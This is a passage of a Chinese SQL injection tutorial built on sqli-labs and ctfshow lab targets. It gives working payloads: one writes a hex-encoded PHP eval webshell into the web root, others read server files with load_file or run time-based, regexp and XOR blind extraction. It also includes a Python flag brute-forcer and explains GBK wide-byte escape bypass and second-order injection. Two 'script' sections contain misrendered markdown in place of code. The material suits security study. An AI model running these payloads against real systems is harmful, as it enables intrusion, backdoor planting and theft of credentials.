class="string">?id=-1&#x27;</span> union select 1,0x3c3f70687020406576616c28245f504f53545b315d293b203f3e,3 into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span>--+</span><br></pre></td></tr></table></figure><p><strong>有回显时 读取文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; union select 1,2,load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;)--+</span></span><br><span class="line"><span class="string"># 文件路径 可使用 十六进制</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> union select 1,2,load_file(0x2f7661722f7777772f68746d6c2f312e706870)--+</span><br></pre></td></tr></table></figure><p><strong>无回显 盲注读取文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1<span class="string">&#x27; and ascii(mid((select hex(load_file(&#x27;</span>/var/www/html/1.php<span class="string">&#x27;))),a,1))&gt;b--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><h3 id="7-2-脚本"><a href="#7-2-脚本" class="headerlink" title="7.2 脚本"></a>7.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 八、延时注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 8.1 手动：结合 Burp Respond</span></span><br><span class="line"></span><br><span class="line">当页面上无回显，也没有输出 SQL 语句执行错误信息。正确的 SQL 语句和错误的 SQL 语句返回页面都一样，可考虑延时注入。</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">?id=1<span class="string">&#x27; and sleep(3)--+</span></span><br></pre></td></tr></table></figure><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(length(database())=a,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 爆破数字 a</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr(database(),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27;),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(ascii(substr((select group_concat(username) from security.users),a,1))=b,sleep(3),1)--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> and <span class="keyword">if</span>(ascii(substr((select group_concat(password) from security.users),a,1))=b,sleep(3),1)--+</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 ascii 值 b</span></span><br></pre></td></tr></table></figure><h3 id="8-2-脚本"><a href="#8-2-脚本" class="headerlink" title="8.2 脚本"></a>8.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 九、regexp 正则匹配</span></span><br><span class="line"></span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;b$&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  1 | Dumb     | Dumb      |</span><br><span class="line">|  3 | Dummy    | p@ssword  |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  8 | admin    | admin     |</span><br><span class="line">|  9 | admin1   | admin1    |</span><br><span class="line">| 10 | admin2   | admin2    |</span><br><span class="line">| 11 | admin3   | admin3    |</span><br><span class="line">| 12 | dhakkan  | dumbo     |</span><br><span class="line">| 14 | admin4   | admin4    |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;^a&#x27;</span>;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;admin[0-9]&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;.n&#x27;</span>;<span class="comment">#.匹配任意字符</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;a|b&#x27;</span>;  <span class="comment">#含有 a 或 b 的</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">10 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="9-1-手动"><a href="#9-1-手动" class="headerlink" title="9.1 手动"></a>9.1 手动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),a,1)regexp(&#x27;</span>b<span class="string">&#x27;),1,2)=&#x27;</span>1</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 字母 b</span></span><br></pre></td></tr></table></figure><h3 id="9-2-脚本"><a href="#9-2-脚本" class="headerlink" title="9.2 脚本"></a>9.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxxx&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,45):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        </span><br><span class="line">        payload = f<span class="string">&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                <span class="built_in">exit</span>(0)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure><h2 id="十、异或注入"><a href="#十、异或注入" class="headerlink" title="十、异或注入"></a>十、异或注入</h2><p><strong>异或</strong>：一种逻辑运算，简言之，<strong>相同为假，不同为真，NULL 与任何条件欲火结果都为 NULL</strong>，mysql 中的符号是 <strong>^  和 xor</strong>。</p><p>测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=1 ^ 1=1 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=1 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=2 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=2 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=1 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor null as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>常用手段：用于判断 所过滤的字符串</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(0)#</span></span><br><span class="line"><span class="string"># 得到正常的回显页面，由于异或之后得到 真</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(1)<span class="comment">#</span></span><br><span class="line"><span class="comment"># 得到错误的回显页面，由于异或之后得到 假</span></span><br></pre></td></tr></table></figure><p>常常用于判断我们所注入的某些字段是否被过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>union<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure><p>如果 <code>union</code> 已被过滤，那么得到的将会是 <code>length(0&gt;0)</code> ，显然是不成立的，那就将会是 <code>1&#39;^0</code> ，得到的为 真，所以将会返回 <strong>正常</strong> 的页面；</p><p>如果 <code>union</code> 没有被过滤，相反的，将会得到为假的异或，返回的将会是 <strong>错误</strong> 的页面。</p><p>由此可以判断某些字符的过滤情况。</p><p>常常使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>select<span class="string">&#x27;)&gt;0)#</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(length(<span class="string">&#x27;and&#x27;</span>)&gt;0)<span class="comment">#</span></span><br><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>or<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure><p><strong>符号特点：</strong></p><ul><li> <code>^</code> 运算符会做位异或运算</li></ul><p>  <img src="https://i.loli.net/2021/08/21/4yJYWol36IcDBx5.png" alt="image-20210821111344451"></p><ul><li><p><code>xor</code> 做逻辑运算 <code>1 xor 0</code> 会输出 1 ，其它情况输出其余所有数据</p><p><img src="https://i.loli.net/2021/08/21/tAPRi3nBOy7E2wc.png" alt="image-20210821111509785"></p></li></ul><h2 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h2><p><strong>防御原理</strong><br>为了防止 SQL注入漏洞，通常在源代码当中会对我们所输入的 SQL查询语句进行一个 转义 ，一般是对 单引号，双引号 进行一个转义变成 &#39; 或者是&quot;，这样Mysql在 执行 SQL语句时，不会影响到查询，即不会出现报错，数据存储在数据库当中时不会含有 \ ，也就是说，它仅仅是在执行 SQL语句时进行了转义，当我们从数据库中向外调出数据时并不会含有 \ ，也就预防了 SQL注入。</p><p><img src="https://i.loli.net/2021/08/20/iSje8ohEVHtCO2M.png" alt="在这里插入图片描述"></p><p>如果我们不进行转义，按照一般 攻击者的思路进行 SQL注入，都是通过 ?id=1’ 进行验证，如下图，如果没有进行任何防御，即没有进行转义操作，就会出现报错，也就很容易的验证出来了 的确存在 SQL注入，并且容易看到注入方式。</p><p><img src="https://i.loli.net/2021/08/20/Y2sylgcHtZCRh84.png" alt="在这里插入图片描述"></p><p><strong>常使用的 转义函数：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">    单引号（<span class="string">&#x27;）</span></span><br><span class="line"><span class="string">    双引号（&quot;）</span></span><br><span class="line"><span class="string">    反斜杠（\）</span></span><br><span class="line"><span class="string">    NULL</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">mysql_real_escape_string() 函数: 转义 SQL 语句中使用的字符串中的特殊字符</span></span><br><span class="line"><span class="string">下列字符受影响：</span></span><br><span class="line"><span class="string">    \x00</span></span><br><span class="line"><span class="string">    \n</span></span><br><span class="line"><span class="string">    \r</span></span><br><span class="line"><span class="string">    \</span></span><br><span class="line"><span class="string">    &#x27;</span></span><br><span class="line">    <span class="string">&quot;</span></span><br><span class="line"><span class="string">    \x1a</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">addslashes()</span></span><br></pre></td></tr></table></figure><p><strong>解决：</strong></p><ul><li><p>网页连接数据库时，将字符编码设置为 <strong>GBK 编码集合</strong>，然后进行 SQL语句的拼接，进行数据库的查询。</p></li><li><p><strong>GBK编码采用 双字节编码，编码范围为 8140~FEFE</strong></p></li><li><p>转义字符 <code>\</code> 的编码是 <code>5c</code> ，其在 GBK的编码范围之内，如果我们在转义字符之前 提交一个同样在编码范围之内的字符，网页在解析时，就会将其与 后面的转义字符进行一个匹配，组成一个 双字节的 GBK编码的汉字，从而失去了转义的作用。</p></li><li><p><strong>常用方法：在使用单引号 或者 双引号之前添加 %df 字符</strong></p></li><li><p><strong>方法二：在使用单引号 或者 双引号之前添加 %aa%5c 字符</strong></p></li><li><p>解释：</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例如:  ?id=1%aa%5c<span class="string">&#x27; </span></span><br><span class="line"><span class="string">其实是： ?id=1%aa\&#x27;</span> </span><br><span class="line">即： ?id=1%aa%\\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">其中 \ 是 %5c;  &#x27;</span> 是 %27</span><br><span class="line">数据库中做了转义处理之后变成：%aa%5c%5c%5c%27</span><br><span class="line">这样，%aa和%5c进行组合称为了一个汉字，%5c与%5c仍旧是 \\ ，而 %27(单引号) 就分离出来了</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK编码范围</a></p><h2 id="十二、二次注入"><a href="#十二、二次注入" class="headerlink" title="十二、二次注入"></a>十二、二次注入</h2><p><strong>根源在于：来发这信任从数据库中取出的数据都是无害的。</strong></p><blockquote><p><strong>原理</strong>：攻击者构造的恶意数据 存储在 数据库 后，恶意数据 被读取 并进入到 SQL查询语句 所导致的注入。<br>防御者可能在用户 输入 恶意数据时对其中的特殊字符进行了 <strong>转义处理</strong> ，但在恶意数据插入到数据库时被处理的数据又 <strong>被还原</strong> 并存储在数据库中，当Web程序 <strong>调用</strong> 存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>也就是说在应用程序中输入恶意造的数据库查询语句时会被转义，但是在数据库内部调用读取语句的时候又被还原。</strong></p></blockquote><blockquote><p><strong>二次注入步骤</strong>:<br>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了 <strong>转义处理</strong>，在<strong>写入数据库的时候又保留了原来的数据</strong>。<br>第二步：引用恶意数据<br><strong>开发者默认存入数据库的数据都是安全的，在进行查询即调用已存储在数据库中的数据时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</strong></p></blockquote><ul><li>一般结合 <strong>修改密码 功能点</strong>  进行利用</li></ul><p>举例：</p><ol><li><p>已知用户登陆时的查询  <code>login.php</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询防御：login.php</span><br><span class="line">$username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们使用下面 <strong>用户登录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Dumb</span></span><br></pre></td></tr></table></figure><p>则实际进行操作的语句成为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;Dumb\&#x27;&#x27; and password=&#x27;</span>Dumb<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>由于进行了 <code>mysql_real_escape_string</code> 转义，则不会引发 sql 注入，从而成功进行了防御</p></li><li><p>已知注册用户时的插入 <code>login_create.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">插入防御：login_create.php</span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="variable">$username</span>\&quot;, \&quot;<span class="variable">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们 <strong>注册新的用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure><p>同样对我们输入的数据进行了转义处理，则实际操作语句是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username 进行转义处理之后得到 Dumb\<span class="string">&#x27;#，代入，即</span></span><br><span class="line"><span class="string">insert into users ( username, password) values(\&quot;Dumb\&#x27;</span><span class="comment">#\&quot;, \&quot;123456\&quot;)</span></span><br></pre></td></tr></table></figure><p>这样我们成功注册了一个新的用户 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure></li><li><p>已知用户修改密码  <code>pass_change.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="variable">$pass</span>&#x27; where username=&#x27;<span class="variable">$username</span>&#x27; and password=&#x27;<span class="variable">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到，此时的用户名没有进行转义防御就出现在了sql语句当中</p></li><li><p>我们以新注册的 <code>Dumb&#39;#</code> 用户登录进去，利用修改密码的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 